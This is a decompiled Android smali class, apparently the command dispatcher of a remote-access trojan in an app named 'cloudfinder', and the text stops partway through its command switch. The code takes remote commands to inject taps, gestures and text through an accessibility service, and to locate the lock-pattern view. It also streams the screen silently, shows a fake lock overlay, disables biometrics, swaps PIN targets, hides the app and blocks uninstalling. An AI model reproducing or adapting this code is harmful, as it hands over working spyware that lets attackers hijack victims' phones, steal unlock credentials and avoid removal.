.class public final Lڜٟٱڀ/أ;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static ا:Lڜٟٱڀ/أ;


# instance fields
.field public final ؋:Landroid/content/Context;

.field public final ؠ:Lڜٟٱڀ/د;

.field public ء:Z

.field public آ:Lorg/json/JSONArray;

.field public أ:Landroid/os/PowerManager$WakeLock;

.field public ؤ:Landroid/net/wifi/WifiManager$WifiLock;

.field public إ:Landroid/graphics/Path;

.field public ئ:J


# direct methods
.method public constructor <init>(Landroid/content/Context;Lڜٟٱڀ/د;)V
    .locals 2

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lڜٟٱڀ/أ;->ء:Z

    const/4 v1, 0x0

    iput-object v1, p0, Lڜٟٱڀ/أ;->آ:Lorg/json/JSONArray;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    iput-object p1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    iput-object p2, p0, Lڜٟٱڀ/أ;->ؠ:Lڜٟٱڀ/د;

    sput-object p0, Lڜٟٱڀ/أ;->ا:Lڜٟٱڀ/أ;

    const-string p2, "config"

    invoke-virtual {p1, p2, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    const-string p2, "antiDelete"

    const/4 v0, 0x1

    invoke-interface {p1, p2, v0}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    return-void
.end method

.method public final reportAntiDeleteResult(Z)V
    .locals 7

    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    if-eqz p1, :cond_action_off

    const-string v1, "antiDeleteOn"

    goto :goto_action_ready

    :cond_action_off
    const-string v1, "antiDeleteOff"

    :goto_action_ready
    const-string v2, "action"

    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "success"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "anti_uninstall"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v2, "effect"

    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v1, p0, Lڜٟٱڀ/أ;->ؠ:Lڜٟٱڀ/د;

    const-string v2, "deviceId"

    iget-object v3, v1, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v1, v1, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    if-eqz v1, :cond_done

    const-string v2, "action_result"

    invoke-virtual {v1, v2, v0}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_done

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "antiDelete action_result failed"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_done
    :goto_done
    return-void
.end method

.method public static ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocused()Z

    move-result v0

    if-eqz v0, :cond_0

    return-object p0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_3

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_2

    invoke-static {v1}, Lڜٟٱڀ/أ;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_1

    return-object v2

    :cond_1
    :try_start_0
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_3
    const/4 p0, 0x0

    return-object p0
.end method

.method public static ء(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 3

    const/16 v0, 0xc

    if-le p2, v0, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    return-object p0

    :cond_1
    const/4 v0, 0x0

    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_4

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_3

    add-int/lit8 v2, p2, 0x1

    invoke-static {v1, p1, v2}, Lڜٟٱڀ/أ;->ء(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_2

    return-object v2

    :cond_2
    :try_start_0
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_3
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_4
    :goto_1
    const/4 p0, 0x0

    return-object p0
.end method

.method public static ح(Lorg/json/JSONObject;)V
    .locals 4

    const-string v0, "bounds"

    invoke-virtual {p0, v0}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object p0

    if-eqz p0, :cond_0

    const-string v0, "left"

    invoke-virtual {p0, v0}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v0

    const-string v1, "top"

    invoke-virtual {p0, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v1

    const-string v2, "right"

    invoke-virtual {p0, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v2

    const-string v3, "bottom"

    invoke-virtual {p0, v3}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result p0

    add-int/2addr v0, v2

    div-int/lit8 v0, v0, 0x2

    add-int/2addr v1, p0

    div-int/lit8 v1, v1, 0x2

    sget-object p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object p0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz p0, :cond_0

    invoke-virtual {p0, v0, v1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ث(II)V

    :cond_0
    return-void
.end method

.method public static خ(Lorg/json/JSONObject;)V
    .locals 0

    invoke-static {p0}, Lڜٟٱڀ/أ;->ح(Lorg/json/JSONObject;)V

    return-void
.end method

.method public static د(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "x"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v0

    const-string v2, "y"

    invoke-virtual {p0, v2, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v1, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v1, :cond_0

    invoke-virtual {v1, v0, p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ث(II)V

    :cond_0
    return-void
.end method

.method public static ص(Lorg/json/JSONObject;)V
    .locals 13

    const-string v0, "y"

    const-string v1, "x"

    const-string v2, "t"

    const-string v3, "gesture"

    invoke-virtual {p0, v3}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p0

    if-eqz p0, :cond_6

    invoke-virtual {p0}, Lorg/json/JSONArray;->length()I

    move-result v3

    const/4 v4, 0x2

    if-ge v3, v4, :cond_0

    goto/16 :goto_2

    :cond_0
    sget-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v3, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-nez v3, :cond_1

    return-void

    :cond_1
    const/4 v4, 0x0

    invoke-virtual {p0, v4}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v5

    if-eqz v5, :cond_5

    const-string v6, "flag"

    invoke-virtual {v5, v6}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_5

    :try_start_0
    new-instance v8, Landroid/graphics/Path;

    invoke-direct {v8}, Landroid/graphics/Path;-><init>()V

    invoke-virtual {v5, v2, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v4

    invoke-virtual {v5, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v6

    int-to-float v6, v6

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v5

    int-to-float v5, v5

    invoke-virtual {v8, v6, v5}, Landroid/graphics/Path;->moveTo(FF)V

    const/4 v5, 0x1

    move v6, v4

    :goto_0
    invoke-virtual {p0}, Lorg/json/JSONArray;->length()I

    move-result v7

    if-ge v5, v7, :cond_3

    invoke-virtual {p0, v5}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v7

    if-nez v7, :cond_2

    goto :goto_1

    :cond_2
    invoke-virtual {v7, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v9

    int-to-float v9, v9

    invoke-virtual {v7, v0}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v10

    int-to-float v10, v10

    invoke-virtual {v8, v9, v10}, Landroid/graphics/Path;->lineTo(FF)V

    invoke-virtual {v7, v2, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v6

    :goto_1
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    :cond_3
    sub-int/2addr v6, v4

    invoke-static {}, Landroid/view/ViewConfiguration;->getTapTimeout()I

    move-result p0

    add-int/lit8 p0, p0, 0x32

    if-ge v6, p0, :cond_4

    invoke-static {}, Landroid/view/ViewConfiguration;->getTapTimeout()I

    move-result p0

    add-int/lit8 v6, p0, 0x32

    :cond_4
    new-instance p0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance v0, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v9, 0x0

    int-to-long v11, v6

    move-object v7, v0

    invoke-direct/range {v7 .. v12}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {p0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p0

    const/4 v0, 0x0

    invoke-virtual {v3, p0, v0, v0}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception p0

    const-string v0, "CommandDispatcher"

    const-string v1, "gestureB flag-format error"

    invoke-static {v0, v1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_2

    :cond_5
    invoke-virtual {v3, p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ه(Lorg/json/JSONArray;)V

    :cond_6
    :goto_2
    return-void
.end method

.method public static ط(Lorg/json/JSONObject;)V
    .locals 1

    const-string v0, "points"

    invoke-virtual {p0, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p0

    if-eqz p0, :cond_0

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ه(Lorg/json/JSONArray;)V

    :cond_0
    return-void
.end method

.method public static ؽ(Lorg/json/JSONObject;)V
    .locals 2

    const-string v0, "input"

    const-string v1, ""

    invoke-virtual {p0, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    invoke-virtual {v0, p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؿ(Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method public static ٽ()V
    .locals 1

    const/4 v0, 0x1

    invoke-static {v0}, Lڜٟٱڀ/أ;->ڣ(I)V

    return-void
.end method

.method public static څ(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "quality"

    const/16 v1, 0x1e

    invoke-virtual {p0, v0, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v0

    const-string v1, "size"

    const/4 v2, 0x4

    invoke-virtual {p0, v1, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    sget v1, Lڝږ؁ڋ/د;->؋:I

    const/16 v1, 0xa

    invoke-static {v0, v1}, Ljava/lang/Math;->max(II)I

    move-result v0

    sput v0, Lڝږ؁ڋ/د;->ؠ:I

    const/4 v0, 0x1

    invoke-static {p0, v0}, Ljava/lang/Math;->max(II)I

    move-result p0

    sput p0, Lڝږ؁ڋ/د;->؋:I

    sget-object p0, Lڝږ؁ڋ/د;->ء:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {p0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result p0

    if-nez p0, :cond_0

    invoke-static {}, Lڝږ؁ڋ/د;->آ()V

    new-instance p0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {p0, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v0, Lةؽڗںۍټ٘/؋;

    invoke-direct {v0, v1}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    const-wide/16 v1, 0x7d0

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_0
    return-void
.end method

.method public static ڋ(Lorg/json/JSONObject;)V
    .locals 3

    invoke-static {}, Lڜأِجطّثٮ/أ;->آ()V

    const-string v0, "quality"

    const/16 v1, 0x41

    invoke-virtual {p0, v0, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v0

    const-string v1, "size"

    const/4 v2, 0x1

    invoke-virtual {p0, v1, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    sget v1, Lڝږ؁ڋ/د;->؋:I

    const/16 v1, 0xa

    invoke-static {v0, v1}, Ljava/lang/Math;->max(II)I

    move-result v1

    sput v1, Lڝږ؁ڋ/د;->ؠ:I

    invoke-static {p0, v2}, Ljava/lang/Math;->max(II)I

    move-result v1

    sput v1, Lڝږ؁ڋ/د;->؋:I

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "startSilentStream q="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " s="

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "CommandDispatcher"

    invoke-static {v0, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {}, Lڝږ؁ڋ/د;->آ()V

    return-void
.end method

.method public static ڏ()V
    .locals 0

    invoke-static {}, Lڜٟٱڀ/أ;->ڜ()V

    return-void
.end method

.method public static ڐ()V
    .locals 0

    invoke-static {}, Lڝږ؁ڋ/د;->أ()V

    return-void
.end method

.method public static ږ()V
    .locals 1

    const/4 v0, 0x0

    invoke-static {v0}, Lڝږ؁ڋ/ح;->ئ(Z)V

    return-void
.end method

.method public static ڗ()V
    .locals 1

    const/4 v0, 0x1

    invoke-static {v0}, Lڝږ؁ڋ/ح;->ئ(Z)V

    return-void
.end method

.method public static ڜ()V
    .locals 3

    sget-object v0, Lڝږ؁ڋ/د;->آ:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    sget-object v0, Lڝږ؁ڋ/د;->ء:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {}, Lڝږ؁ڋ/د;->أ()V

    :cond_0
    invoke-static {}, Lڝږ؁ڋ/ح;->ء()V

    const-string v0, "CommandDispatcher"

    :try_start_0
    sget-object v1, Lڝږ؁ڋ/ظ;->ة:Lڝږ؁ڋ/ظ;

    if-eqz v1, :cond_1

    iget-boolean v2, v1, Lڝږ؁ڋ/ظ;->ا:Z

    if-eqz v2, :cond_1

    invoke-virtual {v1}, Lڝږ؁ڋ/ظ;->ئ()V

    const-string v1, "Fake lock overlay hidden by command"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "handleHideLockOverlay error"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_1
    :goto_0
    return-void
.end method

.method public static ڠ(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "candidate"

    const-string v1, ""

    invoke-virtual {p0, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "sdpMLineIndex"

    const/4 v2, 0x0

    invoke-virtual {p0, v1, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    const-string v1, "sdpMid"

    const-string v2, "0"

    invoke-virtual {p0, v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result p0

    if-nez p0, :cond_0

    sget p0, Lcom/lite/cloudfinder/service/WebRTCStreamService;->؋:I

    :cond_0
    return-void
.end method

.method public static ڡ(Lorg/json/JSONObject;)V
    .locals 2

    const-string v0, "sdp"

    const-string v1, ""

    invoke-virtual {p0, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result p0

    if-nez p0, :cond_0

    sget p0, Lcom/lite/cloudfinder/service/WebRTCStreamService;->؋:I

    :cond_0
    return-void
.end method

.method public static ڣ(I)V
    .locals 1

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :cond_0
    return-void
.end method

.method public static ڤ(Landroid/view/accessibility/AccessibilityNodeInfo;I)Landroid/graphics/Rect;
    .locals 3

    const/16 v0, 0xa

    if-le p1, v0, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_2

    const-string v1, "lockPatternView"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "patternView"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    :cond_1
    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v0}, Landroid/graphics/Rect;->width()I

    move-result v1

    const/16 v2, 0x64

    if-le v1, v2, :cond_2

    invoke-virtual {v0}, Landroid/graphics/Rect;->height()I

    move-result v1

    if-le v1, v2, :cond_2

    return-object v0

    :cond_2
    const/4 v0, 0x0

    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_4

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_3

    add-int/lit8 v2, p1, 0x1

    invoke-static {v1, v2}, Lڜٟٱڀ/أ;->ڤ(Landroid/view/accessibility/AccessibilityNodeInfo;I)Landroid/graphics/Rect;

    move-result-object v2

    :try_start_0
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    if-eqz v2, :cond_3

    return-object v2

    :cond_3
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_4
    :goto_1
    const/4 p0, 0x0

    return-object p0
.end method


# virtual methods
.method public final ؋(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 21

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    move-object/from16 v3, p2

    const-string v4, "adbPairStatus"

    const-string v5, "message"

    const-string v6, "type"

    const-string v7, "packages"

    const-string v8, "keywords"

    const-string v9, "adbStatus responded: "

    const-string v10, "adbStatus\u5f02\u5e38: "

    const-string v11, "Unknown action: "

    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "Dispatch: "

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    const-string v13, "CommandDispatcher"

    invoke-static {v13, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    invoke-virtual/range {p1 .. p1}, Ljava/lang/String;->hashCode()I

    move-result v12

    const/16 v16, 0x2

    const/16 v17, 0x3

    const/16 v18, 0x6

    sparse-switch v12, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    const-string v12, "installPermission"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x69

    goto/16 :goto_1

    :sswitch_1
    const-string v12, "disableBiometric"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x58

    goto/16 :goto_1

    :sswitch_2
    const-string v12, "gestureB"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x20

    goto/16 :goto_1

    :sswitch_3
    const-string v12, "startSilentStream"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/4 v12, 0x5

    goto/16 :goto_1

    :sswitch_4
    const-string v12, "requestfloaty"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x68

    goto/16 :goto_1

    :sswitch_5
    const-string v12, "hideMyMainActivity"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x7c

    goto/16 :goto_1

    :sswitch_6
    const-string v12, "stopAdbTree"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0xa1

    goto/16 :goto_1

    :sswitch_7
    const-string v12, "admLockRule"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x5d

    goto/16 :goto_1

    :sswitch_8
    const-string v12, "replacePinTargets"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x8c

    goto/16 :goto_1

    :sswitch_9
    const-string v12, "updatePageRule"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x3f

    goto/16 :goto_1

    :sswitch_a
    const-string v12, "swipePwdScreenOff"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x85

    goto/16 :goto_1

    :sswitch_b
    const-string v12, "inputSend"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x1f

    goto/16 :goto_1

    :sswitch_c
    const-string v12, "realtimeSet"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x80

    goto/16 :goto_1

    :sswitch_d
    const-string v12, "showShortcuts"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x54

    goto/16 :goto_1

    :sswitch_e
    const-string v12, "startAutoPair"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x8d

    goto/16 :goto_1

    :sswitch_f
    const-string v12, "hideLockOverlay"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x87

    goto/16 :goto_1

    :sswitch_10
    const-string v12, "reqPerList"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x67

    goto/16 :goto_1

    :sswitch_11
    const-string v12, "addPinTargets"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x8b

    goto/16 :goto_1

